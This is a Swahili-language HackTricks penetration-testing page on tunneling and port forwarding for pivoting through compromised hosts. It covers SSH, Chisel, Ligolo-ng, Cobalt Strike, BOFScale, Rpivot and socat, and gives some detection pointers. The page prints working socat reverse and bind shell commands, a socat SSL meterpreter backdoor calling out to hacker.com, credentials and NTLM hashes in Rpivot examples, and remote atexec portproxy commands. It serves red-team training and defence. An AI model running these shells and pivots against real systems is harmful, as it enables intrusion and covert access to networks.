# Uwekaji wa Tunnel na Usambazaji wa Port

{{#include ../banners/hacktricks-training.md}}

## Kidokezo cha Nmap

> [!WARNING]
> Usaidizi wa Nmap kwa proxy unahusu miunganisho ya TCP pekee na hauathiri uchanganuzi wa ping, port au utambuzi wa OS. Wakati scanner iko nyuma ya SOCKS proxy, **zima utambuzi wa host** (`-Pn`) na utumie **uchanganuzi wa TCP connect** (`-sT`).<sup>[[5]](#references)</sup>

## **Bash**

**Host -> Jump -> InternalA -> InternalB**

Amri ya mwisho hutumia chaguo za `-u` na `-i` za Evil-WinRM kubainisha akaunti na host ya WinRM; port yake chaguomsingi ya WinRM ni 5985.<sup>[[4]](#references)</sup>

```bash
# On the jump server connect the port 3333 to the 5985
mknod backpipe p;
nc -lvnp 5985 0<backpipe | nc -lvnp 3333 1>backpipe

# On InternalA accessible from Jump and can access InternalB
## Expose port 3333 and connect it to the winrm port of InternalB
exec 3<>/dev/tcp/internalB/5985
exec 4<>/dev/tcp/Jump/3333
cat <&3 >&4 &
cat <&4 >&3 &

# From the host, you can now access InternalB from the Jump server
evil-winrm -u username -i Jump
```

## **SSH**

OpenSSH inaweza kuelekeza miunganisho ya X11, porti za TCP zisizo na kikomo, na soketi za Unix-domain kupitia chaneli yake iliyosimbwa kwa njia fiche.<sup>[[6]](#references)</sup>

Muunganisho wa picha wa SSH (X)

`-Y` huwasha uelekezaji wa X11 unaoaminika, na `-C` huomba data inayoelekezwa ibanwe.<sup>[[6]](#references)</sup>

```bash
ssh -Y -C <user>@<ip> #-Y is less secure but faster than -X
```

### Remote Port2Port

Fungua Port mpya kwenye SSH Server --> Port nyingine

Uelekezaji wa Remote (`-R`) husikiliza kwenye SSH server na kuunganisha kwenye upande wa ndani; anwani ya bind iliyobainishwa hudhibiti ni interfaces zipi zinaweza kufikia listener hiyo.<sup>[[6]](#references)</sup>

```bash
ssh -R 0.0.0.0:10521:127.0.0.1:1521 user@10.0.0.1 #Local port 1521 accessible in port 10521 from everywhere
```

```bash
ssh -R 0.0.0.0:10521:10.0.0.1:1521 user@10.0.0.1 #Remote port 1521 accessible in port 10521 from everywhere
```

### Port2Port

Ya ndani --> Host iliyodhibitiwa (SSH) --> Third_box:Port

Usambazaji wa port wa ndani (`-L`) husikiliza kwenye client na huunganisha kwenye lengwa kutoka upande wa SSH server.<sup>[[6]](#references)</sup>

```bash
ssh -i ssh_key <user>@<ip_compromised> -L <attacker_port>:<ip_victim>:<remote_port> [-p <ssh_port>] [-N -f]  #This way the terminal is still in your host
#Example
sudo ssh -L 631:<ip_victim>:631 -N -f -l <username> <ip_compromised>
```

### Port2hostnet (proxychains)

Porti ya ndani --> Hosti iliyoathiriwa (SSH) --> Popote

Usambazaji wa Dynamic (`-D`) huunda kisikilizaji cha ndani cha SOCKS4/SOCKS5 ambacho miunganisho yake hufunguliwa kutoka upande wa mbali.<sup>[[6]](#references)</sup>

```bash
ssh -f -N -D <attacker_port> <username>@<ip_compromised> #All sent to local port will exit through the compromised server (use as proxy)
```

### Kuruka kupitia hop nyingi kwa ProxyJump

`-J`/`ProxyJump` huunganisha kwenye lengo kupitia hosti moja au zaidi za kurukia, zilizotenganishwa kwa koma. Chaguo za forwarding bado ni za muunganisho wa mwisho wa SSH, kwa hivyo SOCKS listener iliyo hapa chini hufungua maeneo lengwa kutoka `internal-target`, wala si kutoka kwenye bastion ya kwanza. Hii huepusha kuingia kwenye hosti ya kurukia na kuanzisha SSH client ya pili hapo.<sup>[[6]](#references)</sup>

```bash
# Reach the final SSH server through two bastions
ssh -J user1@jump1:22,user2@jump2:22 user3@internal-target

# Create a local SOCKS proxy whose connections exit from internal-target
ssh -J user1@jump1,user2@jump2 -N -D 127.0.0.1:1080 user3@internal-target
```

Chaguo mahususi kwa host za kurukia zinapaswa kuwekwa kwenye `~/.ssh/config`; usanidi wa mstari wa amri unaokusudiwa kwa host lengwa hautumiki kiotomatiki kwa host za kati.<sup>[[6]](#references)</sup>

### Reverse Port Forwarding

Hii ni muhimu ili kupata reverse shells kutoka kwa host za ndani kupitia DMZ hadi kwenye host yako:

Mpangilio wa `GatewayPorts` wa server hudhibiti ikiwa remote forward inaweza kufunga anwani nje ya loopback; thamani yake chaguomsingi ni `no`.<sup>[[7]](#references)</sup>

```bash
ssh -i dmz_key -R <dmz_internal_ip>:443:0.0.0.0:7000 root@10.129.203.111 -vN
# Now you can send a rev to dmz_internal_ip:443 and capture it in localhost:7000
# Note that port 443 must be open
# Also, remmeber to edit the /etc/ssh/sshd_config file on Ubuntu systems
# and change the line "GatewayPorts no" to "GatewayPorts yes"
# to be able to make ssh listen in non internal interfaces in the victim (443 in this case)
```

### VPN-Tunnel

Mfano huu unaotumia root huunda vifaa vya tunnel kwenye hosti zote mbili. Server lazima iruhusu usambazaji wa tun, na akaunti iliyochaguliwa lazima iwe na ufikiaji wa kifaa cha tun; `PermitRootLogin yes` ni njia mojawapo ya kutumia akaunti ya `root` hapa.<sup>[[6]](#references)[[7]](#references)</sup>\
`PermitRootLogin yes`\
`PermitTunnel yes`

```bash
ssh root@server -w any:any #This will create Tun interfaces in both devices
ip addr add 1.1.1.2/32 peer 1.1.1.1 dev tun0 #Client side VPN IP
ip link set tun0 up #Activate the client side network interface
ip addr add 1.1.1.1/32 peer 1.1.1.2 dev tun0 #Server side VPN IP
ip link set tun0 up #Activate the server side network interface
```

Washa forwarding upande wa Server

```bash
echo 1 > /proc/sys/net/ipv4/ip_forward
iptables -t nat -A POSTROUTING -s 1.1.1.2 -o eth0 -j MASQUERADE
```

Weka njia mpya upande wa mteja

```
route add -net 10.0.0.0/16 gw 1.1.1.1
```

> [!NOTE]
> **Usalama – Terrapin Attack (CVE-2023-48795)**  
> OpenSSH 9.6 iliongeza kiendelezi cha strict-KEX ili kukabiliana na shambulio la Terrapin la kuathiri uadilifu wa data katika hatua za mwanzo za usafirishaji. Sasisha pande zote mbili inapowezekana na ufuate mwongozo wa vendor kwa matoleo ya zamani badala ya kudhani kuwa channel iliyoforwardiwa imelindwa kwa sababu ya toleo pekee.<sup>[[8]](#references)</sup>

## SSHUTTLE

Unaweza kufanya **tunnel** kupitia **ssh** ili kuelekeza **traffic** yote ya **subnetwork** kupitia host.\
Kwa mfano, kuelekeza traffic yote inayoenda 10.10.10.0/24

`sshuttle` hutoa proxying ya uwazi kupitia SSH na inasaidia kuchagua subnets na amri maalum ya SSH kama inavyoonyeshwa hapa chini.<sup>[[9]](#references)</sup>

```bash
pip install sshuttle
sshuttle -r user@host 10.10.10.10/24
```

Unganisha kwa kutumia ufunguo wa faragha

```bash
sshuttle -D -r user@host 10.10.10.10 0/0 --ssh-cmd 'ssh -i ./id_rsa'
# -D : Daemon mode
```

## Meterpreter

`portfwd` ya Metasploit inasaidia forwarding ya ndani na ya mbali, huku moduli yake ya SOCKS proxy ikiwa imekusudiwa kufanya kazi na session routes au `autoroute` na kusikiliza kwenye port 1080 kwa chaguomsingi katika mifano hii.<sup>[[10]](#references)[[11]](#references)[[12]](#references)</sup>

### Port2Port

Local port --> Compromised host (active session) --> Third_box:Port

```bash
# Inside a meterpreter session
portfwd add -l <attacker_port> -p <Remote_port> -r <Remote_host>
```

### SOCKS

```bash
background# meterpreter session
route add <IP_victim> <Netmask> <Session> # (ex: route add 10.10.10.14 255.255.255.0 8)
use auxiliary/server/socks_proxy
run #Proxy port 1080 by default
echo "socks4 127.0.0.1 1080" > /etc/proxychains.conf #Proxychains
```

Njia nyingine:

```bash
background #meterpreter session
use post/multi/manage/autoroute
set SESSION <session_n>
set SUBNET <New_net_ip> #Ex: set SUBNET 10.1.13.0
set NETMASK <Netmask>
run
use auxiliary/server/socks_proxy
set VERSION 4a
run #Proxy port 1080 by default
echo "socks4 127.0.0.1 1080" > /etc/proxychains.conf #Proxychains
```

## Cobalt Strike

Beacon ya Cobalt Strike inaweza kuelekeza miunganisho ya SOCKS4a/SOCKS5 kupitia Beacon; `rportfwd` hufunga port kwenye host iliyoathiriwa, huku `rportfwd_local` ikianzisha muunganisho wa kwenda lengwa kutoka kwa client ya Cobalt Strike.<sup>[[13]](#references)[[14]](#references)</sup>

### SOCKS proxy

Fungua port kwenye Team Server kwenye interfaces zinazopaswa kuelekeza traffic kupitia Beacon.<sup>[[13]](#references)</sup>

```bash
beacon> socks 1080
[+] started SOCKS4a server on: 1080

# Set port 1080 as proxy server in proxychains.conf
proxychains nmap -n -Pn -sT -p445,3389,5985 10.10.17.25
```

### rPort2Port

> [!WARNING]
> Katika hali hii, port inafunguliwa kwenye host ya Beacon, si kwenye Team Server, na traffic inatumwa kwa Team Server na kutoka hapo hadi host:port iliyoonyeshwa.<sup>[[14]](#references)</sup>

```bash
rportfwd [bind port] [forward host] [forward port]
rportfwd stop [bind port]
```

Mwongozo wa reverse-forwarding unaeleza tabia ifuatayo:<sup>[[14]](#references)</sup>

- Reverse port forward ya Beacon imeundwa **kupeleka trafiki kwa Team Server, si kuipitisha kati ya mashine binafsi**.
- Trafiki **hupelekwa ndani ya trafiki ya C2 ya Beacon**, ikijumuisha viungo vya P2P.
- Kwa kawaida, port za juu huepuka vizuizi vya port zinazohitaji ruhusa maalum, lakini sera ya OS lengwa na wasikilizaji waliopo bado hutumika.

### rPort2Port local

> [!WARNING]
> Katika hali hii, **port hufunguliwa kwenye host ya Beacon**, si kwenye Team Server, na **trafiki hutumwa kwa client ya Cobalt Strike** (si kwa Team Server), kisha kutoka hapo hupelekwa kwa host:port iliyoonyeshwa.<sup>[[14]](#references)</sup>

```bash
rportfwd_local [bind port] [forward host] [forward port]
rportfwd_local stop [bind port]
```

## BOFScale - tailnet ya ndani ya mchakato iliyo mbele ya CDN

[BOFScale](https://github.com/NetSPI/BOFscale) huendesha overlay ya Tailscale iliyorekebishwa ndani ya implant ya Windows C2 bila kusakinisha TUN driver au service. Ina vipengele vitatu: BOF-PE ya `tailscaled` ya CGo `c-shared` isiyosawazishwa, BOF-PE ndogo ya C++ inayowasiliana na API ya ndani, na daraja la TCP-to-SOCKS5 la `socksportfwd` lisilosawazishwa.<sup>[[53]](#references)[[54]](#references)</sup>

### TS2021 na DERP zinazooana na CDN

Kwa kawaida, Tailscale hutumia HTTP upgrades za umiliki kwa channel ya udhibiti ya TS2021 inayotumia Noise na relay ya DERP. BOFScale huhifadhi mitiririko hiyo ya baiti lakini huisafirisha kupitia WebSockets za RFC 6455, ikitumia `Sec-WebSocket-Protocol: ts2021` au `derp`. Hivyo, origin ya Headscale/DERP inayodhibitiwa na operator inaweza kuwa nyuma ya CDN inayokubali WebSocket upgrades za kawaida pekee. Client iliyorekebishwa hujaribu tena TS2021 kupitia WebSockets baada ya HTTP `500`, hujaribu tena DERP baada ya HTTP `426`, na hufanya DERP WebSocket dialer itumie mipangilio ya host proxy; BOF huweka `TS_DEBUG_DERP_WS_CLIENT=1` ili kuruka jaribio la kwanza linalojulikana kushindwa.<sup>[[53]](#references)[[54]](#references)</sup>

CDN na origin proxy lazima zihifadhi WebSocket upgrades kwa `/ts2021` na `/derp`, zisambaze `/key` kama HTTP ya kawaida, na zizime read/write timeouts za ndani kwa sababu relay sessions zinaweza kubaki wazi bila kikomo. Usanidi wa Headscale uliotolewa huwasha `verify_clients`, huchapisha tu ramani ya DERP iliyopachikwa ya operator, na huacha `derp.urls` tupu ili kuzuia fallback kwa relays zinazoendeshwa na Tailscale.<sup>[[53]](#references)[[54]](#references)</sup>

### Daemon ya ndani ya mchakato na udhibiti kupitia named pipe

Isipokuwa ibadilishwe, entry point ya BOF huanzisha `tailscaled` kwa `-tun=userspace-networking`, `-state mem:`, na `-no-logs-no-support`, kisha huunda pipe yenye jina la UUID. Huelekeza Go stdout/stderr kupitia OS pipe kwenda kwenye Beacon output API. Hivyo daemon kamili na Go runtime hubaki kwenye kumbukumbu, lakini state na logs haziandikwi kwenye saraka ya Tailscale.<sup>[[53]](#references)[[54]](#references)</sup>

Client nyepesi huiga API ya ndani ya Tailscale ya HTTP/1.0 kupitia pipe hiyo. Hufungua pipe kwa `SECURITY_SQOS_PRESENT | SECURITY_IMPERSONATION` kwa sababu safu ya `safesocket` ya daemon huiga utambulisho wa pipe client, hutuma `Tailscale-Cap: 125`, na huunganisha API ya ndani na operesheni za `up`, `down`, `status`, utangazaji wa route, na kuzima.<sup>[[53]](#references)[[54]](#references)</sup>

> [!WARNING]
> Usiondoe BOF-PE ya Go iliyomapishwa mwenyewe baada ya kuiomba daemon izime: runtime na goroutines za garbage collector zinaweza kuendelea kutekelezwa kutoka kwenye kumbukumbu ambayo loader huondoa mapping yake. Endesha `tailscaled` katika mchakato wa kutolewa kafara na usitishe mchakato huo kwa usafishaji wa mwisho.<sup>[[54]](#references)</sup>

### Elekeza trafiki iliyoanzishwa na host kupitia userspace SOCKS5

Muunganisho unaoingia wa tailnet na routes za subnet zilizotangazwa hufanya kazi ndani ya userspace network stack, lakini michakato ya kawaida kwenye host iliyoathiriwa haina OS route inayoingia kwenye overlay. Kwa hiyo, `socksportfwd` husikiliza kwenye TCP port inayoelekezwa kwa victim, huanzisha mazungumzo ya SOCKS5 `NO AUTH` na listener ya daemon ya `0.0.0.0:1080`, hutuma `CONNECT` kwa destination ya tailnet, na kupeleka trafiki kwa njia zote mbili bila kusawazisha. Ikiwa lengo ni jina la MagicDNS, hutumia `ATYP_DOMAIN`, hivyo `tailscaled` hutatua jina hilo bila kulifichua kwa Windows resolver.<sup>[[53]](#references)[[54]](#references)</sup>

Mtiririko mdogo wa operator umeonyeshwa hapa chini; node ya operator na implant lazima zote zitumie binaries zilizorekebishwa kwa sababu Tailscale ya kawaida haiwezi kupita kwenye usanifu huu wa CDN.<sup>[[53]](#references)[[54]](#references)</sup>

```bash
HEADSCALE_HOSTNAME=<cdn-hostname> docker compose up
# Start tailscaled as an asynchronous BOF and copy its printed pipe name
tailscaled
tailscale --socket '\\.\pipe\<uuid>' up --auth-key <key> --login-server https://<cdn-hostname>
tailscale --socket '\\.\pipe\<uuid>' set --advertise-routes <victim-cidr>
socksportfwd --t <operator-magicdns-name> --tp 8888 --p 8888
```

Local forward inaweza kutenganisha kisikilizaji cha uthibitishaji kinachoonekana na zana ya relay: lazimisha mashine ithibitishe utambulisho wake kwenye port iliyofungwa kwenye host iliyoathiriwa, pitisha muunganisho kupitia tailnet hadi `ntlmrelayx`, kisha relay uendelee hadi AD CS, LDAP, HTTP, SMB au lengwa lingine linalooana. Tazama [WebDAV NTLM coercion](../windows-hardening/ntlm/places-to-steal-ntlm-creds.md#webdav-auth-coercion--credential-validation-via-davclntdlldavsetcookie) na [ESC8 relay to AD CS](../windows-hardening/active-directory-methodology/ad-certificates/domain-escalation.md#ntlm-relay-to-ad-cs-http-endpoints--esc8) kwa hatua mahususi za udhaifu; BOFScale ni ya usafirishaji pekee.<sup>[[54]](#references)</sup>

### Ugunduzi

Tafuta mchanganyiko wa viashiria badala ya kiashiria kimoja dhaifu: Go runtime katika mchakato ambao kwa kawaida hautumii Go, pipe ya UUID yenye SDDL inayoruhusu ruhusa nyingi `D:(A;;GA;;;WD)`, kisikilizaji cha SOCKS kisichotarajiwa kwenye `0.0.0.0:1080`, na WebSocket za TLS zinazodumu kwa muda mrefu hadi anwani za CDN. Ukaguzi wa TLS ukiwa umewashwa, weka alama kwa `Sec-WebSocket-Protocol: derp` au `ts2021` ikiwa mchakato unaomiliki si huduma iliyoidhinishwa ya `tailscaled`. Sheria za `bofscale.yar` kwenye repository hutoa saini za kumbukumbu kwa vipengele vyote vitatu vya BOF-PE.<sup>[[53]](#references)[[54]](#references)</sup>

## reGeorg

[https://github.com/sensepost/reGeorg](https://github.com/sensepost/reGeorg)

Mradi huu hutoa endpoints za web tunnel kama vile `tunnel.aspx`, `tunnel.ashx`, `tunnel.jsp`, na `tunnel.php`; pakia endpoint moja inayotumika kabla ya kuanzisha proxy ya ndani.<sup>[[15]](#references)</sup>

```bash
python reGeorgSocksProxy.py -p 8080 -u http://upload.sensepost.net:8080/tunnel/tunnel.jsp
```

## Chisel

Unaweza kuipakua kutoka ukurasa wa releases wa [https://github.com/jpillora/chisel](https://github.com/jpillora/chisel)\
Chisel husafirisha trafiki ya TCP/UDP kupitia HTTP kwa kutumia muunganisho unaolindwa na SSH; tumia matoleo yanayooana ya client/server na uhakiki sintaksia ya amri ya toleo lililochaguliwa.<sup>[[16]](#references)</sup>

### socks

```bash
./chisel server -p 8080 --reverse #Server -- Attacker
./chisel-x64.exe client 10.10.14.3:8080 R:socks #Client -- Victim
#And now you can use proxychains with port 1080 (default)

./chisel server -v -p 8080 --socks5 #Server -- Victim (needs to have port 8080 exposed)
./chisel client -v 10.10.10.10:8080 socks #Attacker
```

### Port forwarding

```bash
./chisel_1.7.6_linux_amd64 server -p 12312 --reverse #Server -- Attacker
./chisel_1.7.6_linux_amd64 client 10.10.14.20:12312 R:4505:127.0.0.1:4505 #Client -- Victim
```

## wstunnel

[`wstunnel`](https://github.com/erebe/wstunnel) husafirisha forward za static au dynamic kupitia WebSocket, HTTP/2, au WebTransport (HTTP/3 kupitia QUIC). Builds za sasa zinaunga mkono TCP, UDP, Unix sockets, stdio, SOCKS5, HTTP proxying, na listeners za Linux transparent-proxy katika hali za forward na reverse.<sup>[[52]](#references)</sup>

### Reverse SOCKS5 pivot

Endesha server kwenye attacker na ufanye pivot iunganishe kwenda nje kwa kutumia `-R`. Katika mwelekeo huu, listener ya SOCKS5 huundwa kwenye **server**, huku miunganisho iliyoombwa ikianzia kwenye mtandao wa **client/pivot**.<sup>[[52]](#references)</sup>

```bash
# Attacker: use a certificate valid for pivot.example
wstunnel server --tls-certificate cert.pem --tls-private-key key.pem wss://0.0.0.0:443

# Pivot: expose an attacker-side, loopback-only SOCKS5 listener
wstunnel client --tls-verify-certificate \
  -R 'socks5://127.0.0.1:1080' wss://pivot.example:443

# Attacker
proxychains nmap -n -Pn -sT -p 445,3389 10.10.10.0/24
```

Reverse static forward hutumia mwelekeo huohuo. Kwa mfano, amri ifuatayo hufichua `10.10.10.20:445`, kama inavyofikiwa na pivot, kwenye port ya loopback ya attacker `8445`:<sup>[[52]](#references)</sup>

```bash
wstunnel client --tls-verify-certificate \
  -R 'tcp://127.0.0.1:8445:10.10.10.20:445' wss://pivot.example:443
```

### Maelezo ya egress na usafirishaji

- Ongeza `-p http://user:pass@proxy:8080` kwenye client ili kupita kwenye HTTP proxy iliyo wazi. Tumia `socks5h://127.0.0.1:1080` kwenye clients kama `curl` (au wezesha proxied DNS kwenye application) ili majina ya ndani yatatuliwe upande wa pili wa tunnel badala ya kuvuja kwa resolver ya ndani.<sup>[[52]](#references)</sup>
- `wss://` huchagua WebSocket iliyolindwa kwa TLS. Client ya `https://` huchagua HTTP/2, lakini buffering au ubadilishaji wa HTTP/1 unaofanywa na reverse proxies/CDNs mara nyingi huvuruga mtiririko wa pande mbili; wakati wa kujaribu hali hii, weka server ya wstunnel wazi moja kwa moja.<sup>[[52]](#references)</sup>
- `wts://` huchagua WebTransport kupitia QUIC. Anzisha server kwa `--enable-webtransport` (au URL ya kusikiliza ya `wts://`) na uruhusu UDP kwenye port ya kusikiliza. Hali hii haiwezi kupita kwenye HTTP `CONNECT` proxy ya kawaida kwa sababu proxy hiyo hubeba TCP.<sup>[[52]](#references)</sup>

> [!WARNING]
> Mradi wa upstream unaonya usichukulie certificate yake ya kujisaini iliyojumuishwa kama kinga ya faragha. Pendelea certificate maalum iliyo halali pamoja na `--tls-verify-certificate` (au mTLS), weka wasikilizaji wa proxy kwenye loopback isipokuwa ufikiaji wa mbali unahitajika kimakusudi, na tumia tunnel kwa protocols ambazo tayari ni salama pale usiri ni muhimu.<sup>[[52]](#references)</sup>

## Ligolo-ng

[https://github.com/nicocha30/ligolo-ng](https://github.com/nicocha30/ligolo-ng)

Mwongozo wa kuanza haraka wa Ligolo-ng unaeleza interface ya TUN kwenye proxy, uthibitishaji wa fingerprint ya certificate kwa agent, na usanidi wa route kwa mtandao unaopitishwa kwenye tunnel.<sup>[[17]](#references)</sup>

### Tunneling

```bash
# Start proxy server and automatically generate self-signed TLS certificates -- Attacker
sudo ./proxy -selfcert
# Create an interface named "ligolo" -- Attacker
interface_create --name "ligolo"
# Print the currently used certificate fingerprint -- Attacker
certificate_fingerprint
# Start the agent with certification validation -- Victim
./agent -connect <ip_proxy>:11601 -v -accept-fingerprint <fingerprint>
# Select the agent -- Attacker
session
1
# Start the tunnel on the proxy server -- Attacker
tunnel_start --tun "ligolo"
# Display the agent's network configuration -- Attacker
ifconfig
# Create a route to the agent's specified network -- Attacker
interface_add_route --name "ligolo" --route <network_address_agent>/<netmask_agent>
# Display the tun interfaces -- Attacker
interface_list
```

### Kufunga Agent na Kusikiliza

Ligolo-ng inaweza kuongeza listeners kwenye agent zinazotuma trafiki kwenda kwenye anwani ya upande wa proxy, na range yake iliyohifadhiwa ya `240.0.0.0/4` inaweza kuelekezwa ili kufikia huduma za ndani ya agent.<sup>[[18]](#references)[[19]](#references)</sup>

```bash
# Establish a tunnel from the proxy server to the agent
# Create a TCP listening socket on the agent (0.0.0.0) on port 30000 and forward incoming TCP connections to the proxy (127.0.0.1) on port 10000 -- Attacker
listener_add --addr 0.0.0.0:30000 --to 127.0.0.1:10000 --tcp
# Display the currently running listeners on the agent -- Attacker
listener_list
```

### Ufikiaji wa Port za Ndani za Agent

```bash
# Establish a tunnel from the proxy server to the agent
# Create a route to redirect traffic for 240.0.0.1 to the Ligolo-ng interface to access the agent's local services -- Attacker
interface_add_route --name "ligolo" --route 240.0.0.1/32
```

## Rpivot

[https://github.com/klsecservices/rpivot](https://github.com/klsecservices/rpivot)

Rpivot huanzisha reverse tunnel kutoka kwa mwathiriwa na kufichua SOCKS4 proxy kwenye anwani ya loopback ya mshambuliaji; README yake pia inaeleza chaguo za credentials na hash za NTLM-proxy.<sup>[[20]](#references)</sup>

```bash
attacker> python server.py --server-port 9999 --server-ip 0.0.0.0 --proxy-ip 127.0.0.1 --proxy-port 1080
```

```bash
victim> python client.py --server-ip <rpivot_server_ip> --server-port 9999
```

Pivot kupitia **NTLM proxy**

```bash
victim> python client.py --server-ip <rpivot_server_ip> --server-port 9999 --ntlm-proxy-ip <proxy_ip> --ntlm-proxy-port 8080 --domain CONTOSO.COM --username Alice --password P@ssw0rd
```

```bash
victim> python client.py --server-ip <rpivot_server_ip> --server-port 9999 --ntlm-proxy-ip <proxy_ip> --ntlm-proxy-port 8080 --domain CONTOSO.COM --username Alice --hashes 9b9850751be2515c8231e5189015bbe6:49ef7638d69a01f26d96ed673bf50c45
```

## **Socat**

[https://github.com/andrew-d/static-binaries](https://github.com/andrew-d/static-binaries)

Socat huunganisha aina za anwani kama `TCP-LISTEN`, `EXEC`, `SOCKS4A`, `OPENSSL`, na `PROXY`; mifano iliyo hapa chini inachanganya endpoint hizo zilizoandikwa.<sup>[[21]](#references)</sup>

### Bind shell

```bash
victim> socat TCP-LISTEN:1337,reuseaddr,fork EXEC:bash,pty,stderr,setsid,sigint,sane
attacker> socat FILE:`tty`,raw,echo=0 TCP4:<victim_ip>:1337
```

### Reverse shell

```bash
attacker> socat TCP-LISTEN:1337,reuseaddr FILE:`tty`,raw,echo=0
victim> socat TCP4:<attackers_ip>:1337 EXEC:bash,pty,stderr,setsid,sigint,sane
```

### Port2Port

```bash
socat TCP4-LISTEN:<lport>,fork TCP4:<redirect_ip>:<rport> &
```

### Port2Port kupitia socks

```bash
socat TCP4-LISTEN:1234,fork SOCKS4A:127.0.0.1:google.com:80,socksport=5678
```

### Meterpreter kupitia SSL Socat

```bash
#Create meterpreter backdoor to port 3333 and start msfconsole listener in that port
attacker> socat OPENSSL-LISTEN:443,cert=server.pem,cafile=client.crt,reuseaddr,fork,verify=1 TCP:127.0.0.1:3333
```

```bash
victim> socat.exe TCP-LISTEN:2222 OPENSSL,verify=1,cert=client.pem,cafile=server.crt,connect-timeout=5|TCP:hacker.com:443,connect-timeout=5
#Execute the meterpreter
```

Unaweza kupita kwenye **proxy isiyohitaji uthibitishaji** kwa kutumia aina ya anwani ya `PROXY` iliyoandikwa kwenye nyaraka za socat, kwa kutekeleza mstari huu badala ya wa mwisho kwenye console ya mwathiriwa.<sup>[[21]](#references)</sup>

```bash
OPENSSL,verify=1,cert=client.pem,cafile=server.crt,connect-timeout=5|PROXY:hacker.com:443,connect-timeout=5|TCP:proxy.lan:8080,connect-timeout=5
```

[https://funoverip.net/2011/01/reverse-ssl-backdoor-with-socat-and-metasploit/](https://funoverip.net/2011/01/reverse-ssl-backdoor-with-socat-and-metasploit/)

### Handaki la SSL Socat

**/bin/sh console**

Unda vyeti pande zote mbili: Mteja na Seva

```bash
# Execute these commands on both sides
FILENAME=socatssl
openssl genrsa -out $FILENAME.key 1024
openssl req -new -key $FILENAME.key -x509 -days 3653 -out $FILENAME.crt
cat $FILENAME.key $FILENAME.crt >$FILENAME.pem
chmod 600 $FILENAME.key $FILENAME.pem
```

```bash
attacker-listener> socat OPENSSL-LISTEN:433,reuseaddr,cert=server.pem,cafile=client.crt EXEC:/bin/sh
victim> socat STDIO OPENSSL-CONNECT:localhost:433,cert=client.pem,cafile=server.crt
```

### Remote Port2Port

Unganisha porti ya ndani ya SSH (22) na porti ya 443 ya host ya mshambuliaji.

```bash
attacker> sudo socat TCP4-LISTEN:443,reuseaddr,fork TCP4-LISTEN:2222,reuseaddr #Redirect port 2222 to port 443 in localhost
victim> while true; do socat TCP4:<attacker>:443 TCP4:127.0.0.1:22 ; done # Establish connection with the port 443 of the attacker and everything that comes from here is redirected to port 22
attacker> ssh localhost -p 2222 -l www-data -i vulnerable #Connects to the ssh of the victim
```

## Plink.exe

Plink ni zana ya PuTTY ya kuunganisha kupitia command line, yenye chaguo za SSH forwarding zinazofanana na `ssh`.<sup>[[22]](#references)</sup>

Tumia `-P` yenye herufi kubwa kwa port ya SSH. `-pw` imehifadhiwa kwa ajili ya uoanifu, lakini hufichua nenosiri kwenye orodha ya michakato; ikiwezekana, pendelea uthibitishaji kwa ufunguo au `-pwfile`.<sup>[[22]](#references)[[23]](#references)</sup>

Kwa kuwa binary hii itaendeshwa kwenye kifaa cha mwathiriwa na ni SSH client, fungua huduma na port ya SSH kwa muunganisho wa reverse; mfano unaofuata unatumia `-R` kuelekeza port inayoweza kufikiwa ndani ya mtandao kwenda kwenye mashine ya mshambuliaji.<sup>[[22]](#references)</sup>

```bash
echo y | plink.exe -l <Our_valid_username> -pw <valid_password> [-P <port>] -R <port_ in_our_host>:<next_ip>:<final_port> <your_ip>
echo y | plink.exe -l root -pw password [-P 2222] -R 9090:127.0.0.1:9090 10.11.0.41 #Local port 9090 to out port 9090
```

## Windows netsh

### Port2Port

Tumia mazingira yenye ruhusa zinazohitajika na host unapounda au kubadilisha sheria za `portproxy` za kudumu. Microsoft inaandika miundo ya kuongeza, kuonyesha na kufuta `v4tov4` inayotumika hapa chini.<sup>[[24]](#references)</sup>

```bash
netsh interface portproxy add v4tov4 listenaddress= listenport= connectaddress= connectport= protocol=tcp
# Example:
netsh interface portproxy add v4tov4 listenaddress=0.0.0.0 listenport=4444 connectaddress=10.10.10.10 connectport=4444
# Check the port forward was created:
netsh interface portproxy show v4tov4
# Delete port forward
netsh interface portproxy delete v4tov4 listenaddress=0.0.0.0 listenport=4444
```

### Deploying `portproxy` through a scheduled task

Wakati credentials za kiutawala zinapatikana, kutekeleza Task Scheduler kwa mbali kunaweza kusakinisha kanuni asilia ya forwarding bila kupakia relay maalum. Kwa mfano, [Impacket `atexec`](../windows-hardening/lateral-movement/atexec.md) inaweza kufanya pivot isikilize kwenye TCP/443 na kupeleka muunganisho kwa huduma ya ndani ya SMB.<sup>[[57]](#references)[[58]](#references)</sup>

```bash
atexec.py 'DOMAIN/USER:PASSWORD'@<PIVOT> \
  'netsh interface portproxy add v4tov4 listenport=443 connectaddress=10.0.12.101 connectport=445'
```

Sheria hii ni endelevu, kwa hivyo ihesabu kwa kutumia `netsh interface portproxy show v4tov4` na uiondoe mwenyewe baada ya kufanya majaribio. Kumbuka kuwa `portproxy` hutoa forwarding pekee; firewall ya host lazima pia iruhusu port inayosikilizwa.<sup>[[24]](#references)</sup>

## SocksOverRDP & Proxifier

Unahitaji kuwa na **ufikiaji wa RDP kupitia mfumo**.\
Pakua:

SocksOverRDP hutumia Remote Desktop Dynamic Virtual Channels kubeba muunganisho wa SOCKS5 kupitia session iliyopo ya RDP; plugin ya client husikiliza kwenye `127.0.0.1:1080` huku component ya server ikiendeshwa kwenye target ya RDP.<sup>[[25]](#references)</sup>

1. [SocksOverRDP x64 Binaries](https://github.com/nccgroup/SocksOverRDP/releases) - Zana hii hutumia `Dynamic Virtual Channels` (`DVC`) kutoka kwenye kipengele cha Remote Desktop Service cha Windows. DVC inawajibika kwa **kutunnel packets kupitia muunganisho wa RDP**.
2. [Proxifier Portable Binary](https://www.proxifier.com/download/#win-tab)

Kwenye kompyuta yako ya client, pakia **`SocksOverRDP-Plugin.dll`** hivi:

```bash
# Load SocksOverRDP.dll using regsvr32.exe
C:\SocksOverRDP-x64> regsvr32.exe SocksOverRDP-Plugin.dll
```

Sasa tunaweza **kuunganisha** na **victim** kupitia **RDP** kwa kutumia **`mstsc.exe`**, na tunapaswa kupokea **kidokezo** kinachosema kuwa **SocksOverRDP plugin imewezeshwa**, na itasikiliza kwenye **127.0.0.1:1080**.

**Unganisha** kupitia **RDP**, kisha pakia na utekeleze binary ya `SocksOverRDP-Server.exe` kwenye mashine ya victim:

```
C:\SocksOverRDP-x64> SocksOverRDP-Server.exe
```

Sasa, thibitisha kwenye mashine yako (mshambuliaji) kwamba port 1080 inasikiliza:

```
netstat -antb | findstr 1080
```

